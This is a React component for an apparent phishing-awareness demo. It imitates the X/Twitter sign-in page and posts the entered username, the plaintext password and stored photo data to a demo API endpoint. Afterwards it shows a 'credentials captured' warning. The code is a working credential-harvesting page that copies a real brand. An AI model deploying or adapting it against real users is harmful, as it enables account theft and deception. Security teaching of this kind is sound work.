import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { AlertCircle, ArrowLeft } from 'lucide-react';

export default function TwitterLogin() {
  const navigate = useNavigate();
  const [credentials, setCredentials] = useState({ email: '', password: '' });
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    const sessionId = sessionStorage.getItem('sessionId');
    const photoData = sessionStorage.getItem('lastPhotoData');

    try {
      await fetch('/api/demo/twitter/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sessionId,
          email_or_username: credentials.email,
          password: credentials.password,
          photo_data: photoData,
          timestamp: new Date().toISOString(),
        }),
      }).catch(() => {});
    } finally {
      setIsLoading(false);
      setIsSubmitted(true);
    }
  };

  if (isSubmitted) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-sky-50 to-blue-50 flex items-center justify-center p-4">
        <div className="max-w-2xl w-full">
          <div className="bg-white rounded-xl shadow-2xl p-8">
            <div className="flex justify-center mb-6">
              <div className="bg-red-100 rounded-full p-4">
                <AlertCircle size={40} className="text-red-600" />
              </div>
            </div>

            <h1 className="text-3xl font-bold text-center text-gray-900 mb-4">
              📊 Demonstration Complete
            </h1>

            <div className="bg-red-50 border-l-4 border-red-400 p-6 mb-6 rounded">
              <p className="text-red-800 font-bold mb-4">
                ⚠️ YOUR CREDENTIALS WERE CAPTURED
              </p>
            </div>

            <div className="bg-gray-50 p-4 rounded-lg mb-6">
              <p className="text-sm font-semibold text-gray-700 mb-2">📱 Data Intercepted:</p>
              <ul className="text-sm text-gray-700 space-y-1">
                <li>✓ Username/Email: {credentials.email}</li>
                <li>✓ Password: {"•".repeat(credentials.password.length)}</li>
              </ul>
            </div>

            <div className="flex gap-4">
              <button
                onClick={() => navigate('/')}
                className="flex-1 flex items-center justify-center gap-2 px-6 py-3 bg-gray-600 text-white font-bold rounded-lg hover:bg-gray-700 transition"
              >
                <ArrowLeft size={20} />
                Back to Home
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white flex items-center justify-center p-4">
      <div className="w-full max-w-sm">
        <div className="mb-8 text-center">
          <div className="text-6xl font-black text-black mb-6">𝕏</div>
          <h1 className="text-2xl font-bold text-gray-900 mb-2">Sign in to X</h1>
        </div>

        <form onSubmit={handleSubmit} className="space-y-3 mb-6">
          <input
            type="text"
            placeholder="Phone, email, or username"
            value={credentials.email}
            onChange={(e) => setCredentials({ ...credentials, email: e.target.value })}
            className="w-full px-4 py-3 border border-gray-300 rounded-2xl text-sm placeholder-gray-600 focus:border-blue-400 outline-none"
            required
          />

          <input
            type="password"
            placeholder="Password"
            value={credentials.password}
            onChange={(e) => setCredentials({ ...credentials, password: e.target.value })}
            className="w-full px-4 py-3 border border-gray-300 rounded-2xl text-sm placeholder-gray-600 focus:border-blue-400 outline-none"
            required
          />

          <button
            type="submit"
            disabled={isLoading || !credentials.email || !credentials.password}
            className="w-full bg-blue-500 text-white font-bold py-3 rounded-full hover:bg-blue-600 transition disabled:opacity-50"
          >
            {isLoading ? 'Signing in...' : 'Sign in'}
          </button>
        </form>

        <div className="text-center">
          <p className="text-sm text-gray-600">
            Don't have an account? <span className="text-blue-500 font-bold cursor-pointer">Sign up</span>
          </p>
        </div>

        <div className="mt-8 p-3 bg-yellow-50 border border-yellow-300 rounded-lg">
          <p className="text-xs text-yellow-800">
            <strong>⚠️ Educational Demo:</strong> Not the real Twitter/X!
          </p>
        </div>
      </div>
    </div>
  );
}
